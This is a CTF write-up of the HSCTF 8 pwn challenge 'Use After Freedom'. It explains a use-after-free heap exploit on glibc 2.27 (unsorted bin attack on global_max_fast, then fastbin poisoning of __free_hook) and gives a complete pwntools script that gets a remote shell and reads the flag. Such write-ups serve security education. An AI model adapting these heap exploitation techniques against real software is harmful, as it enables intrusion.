## Use After Freedom

> Points: 493
>
> Solves: 21

### Description:
```
Use after free vulnerabilities are easy to exploit, right?

nc use-after-freedom.hsc.tf 1337
```

### Files:
```
use_after_freedom
libc-2.27.so
```

## Analysis:

Check security
```asm
$ checksec use_after_freedom
[*] '/home/mito/CTF/HSCTF_8/Pwn_Use_After_Freedom/use_after_freedom'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Memory map
```asm
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x555555554000     0x555555556000 r-xp     2000 0      /home/mito/CTF/HSCTF_8/Pwn_Use_After_Freedom/use_after_freedom
    0x555555755000     0x555555756000 r--p     1000 1000   /home/mito/CTF/HSCTF_8/Pwn_Use_After_Freedom/use_after_freedom
    0x555555756000     0x555555757000 rw-p     1000 2000   /home/mito/CTF/HSCTF_8/Pwn_Use_After_Freedom/use_after_freedom
    0x555555757000     0x555555778000 rw-p    21000 0      [heap]
    0x7ffff79e2000     0x7ffff7bc9000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7bc9000     0x7ffff7dc9000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7dc9000     0x7ffff7dcd000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7dcd000     0x7ffff7dcf000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7dcf000     0x7ffff7dd3000 rw-p     4000 0      
    0x7ffff7dd3000     0x7ffff7dfc000 r-xp    29000 0      /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7fd5000     0x7ffff7fd7000 rw-p     2000 0      
    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]
    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]
    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 29000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 2a000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      
    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
```

## Solution:

The vulnerability of this challenge is UAF.

However, the address malloced from the following function must satisfy the following conditions.
Therefore, the address of __free_hook cannot be allocated by malloc.
> 0x555555757260 < malloc address < 0x600000000000

```c
void * FUN_0010092a(int param_1)

{
  void *pvVar1;
  
  pvVar1 = malloc((long)param_1);
  if ((pvVar1 <= DAT_00302010) && (DAT_00302040 <= pvVar1)) {
    return pvVar1;
  }
  puts("Memory corruption detected!");
                    /* WARNING: Subroutine does not return */
  exit(-1);
}

```

```asm
pwndbg> x/30gx 0x555555756000
0x555555756000:	0x0000000000000000	0x0000555555756008
0x555555756010:	0x0000600000000000	0x0000000000000000
0x555555756020 <stdout>:	0x00007ffff7dce760	0x0000000000000000
0x555555756030 <stdin>:	0x00007ffff7dcda00	0x0000000000000000
0x555555756040:	0x0000555555757260	0x0000000000000000
0x555555756050:	0x0000000000000000	0x0000000000000000
```

We can write a large value to global_max_fast with the following command.

> Obtain((FREE_HOOK - MAIN_ARENA)*2-0x10, "A") #0
>
> Obtain(0x100, "/bin/sh\x00") #1
>
> Lose(0)
>
> Change(0, p64(libc_leak) + p64(global_max_fast - 0x10))
>
> Obtain((FREE_HOOK - MAIN_ARENA)*2-0x10, "C") #2
```asm
0x7ffff7dcf930 <dumped_main_arena_end>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcf940 <global_max_fast>:	0x00007ffff7dcdca0	0x0000000000000000
0x7ffff7dcf950 <root>:	0x0000000000000000	0x0000000000000000
```

We write to the extended fastbin with the following command.
> Lose(2)
> 
> Change(0, p64(system_addr))
```asm
0x555555757250:	0x0000000000000000	0x0000000000003951
0x555555757260:	0x00007ffff7a31550	0x747461206e696220
0x555555757270:	0x00000000216b6361	0x0000000000000000
```

We can write the address of system () to __free_hook with the following command.
> Obtain((FREE_HOOK - MAIN_ARENA)*2-0x10, "D") #3
```asm
0x7ffff7dcf8d8 <_IO_stdfile_0_lock+8>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcf8e8 <__free_hook>:	0x00007ffff7a31550	0x0000000000000000
0x7ffff7dcf8f8 <next_to_use.11807>:	0x0000000000000000	0x0000000000000000
```

## Exploit code:
```python
#!/usr/bin/python3
from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './use_after_freedom'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "use-after-freedom.hsc.tf"
  PORT = 1337
  s = remote(HOST, PORT)
  libc = ELF("./libc-2.27.so")
else:
  s = process(BINARY)
  #s = process(BINARY, env={'LD_PRELOAD': './libc-2.27.so'})
  libc = elf.libc
  #libc = ELF("./libc-2.27.so")

def Obtain(size, data):
  s.sendlineafter("> ", "1")
  s.sendlineafter("> ", str(size))
  s.sendlineafter("> ", data)

def Lose(idx):
  s.sendlineafter("> ", "2")
  s.sendlineafter("> ", str(idx))

def Change(idx, data):
  s.sendlineafter("> ", "3")
  s.sendlineafter("> ", str(idx))
  s.sendlineafter("> ", data)

def View(idx):
  s.sendlineafter("> ", "4")
  s.sendlineafter("> ", str(idx))

MAIN_ARENA      = libc.sym.__malloc_hook + 0x10
FREE_HOOK       = libc.sym.__free_hook
GLOBAL_MAX_FAST = 0x3ed940 # 0x7ffff7dcf940 - 0x7ffff79e2000

Obtain((FREE_HOOK - MAIN_ARENA)*2-0x10, "A") #0
Obtain(0x100, "/bin/sh\x00") #1

# libc leak
Lose(0)
View(0)
r = s.recvuntil("\n")[:-1]
libc_leak = u64(r + b"\x00\x00")
libc_base = libc_leak - libc.sym.__malloc_hook - 0x70
global_max_fast = libc_base + GLOBAL_MAX_FAST
system_addr     = libc_base + libc.sym.system
print("libc_leak =", hex(libc_leak))
print("libc_base =", hex(libc_base))

# Unsorted bin attack
Change(0, p64(libc_leak) + p64(global_max_fast - 0x10))
Obtain((FREE_HOOK - MAIN_ARENA)*2-0x10, "C") #2

# fastbin poisoning
Lose(2)
Change(0, p64(system_addr))
Obtain((FREE_HOOK - MAIN_ARENA)*2-0x10, "D") #3

# Start /bin/sh
Lose(1)

s.interactive()
```

## Results:
```bash
mito@ubuntu:~/CTF/HSCTF_8/Pwn_Use_After_Freedom$ python3 solve.py r
[*] '/home/mito/CTF/HSCTF_8/Pwn_Use_After_Freedom/use_after_freedom'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to use-after-freedom.hsc.tf on port 1337: Done
[*] '/home/mito/CTF/HSCTF_8/Pwn_Use_After_Freedom/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
libc_leak = 0x7f69d1731ca0
libc_base = 0x7f69d1346000
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ cat flag
flag{ok_but_why_is_global_max_fast_even_writeable}
```





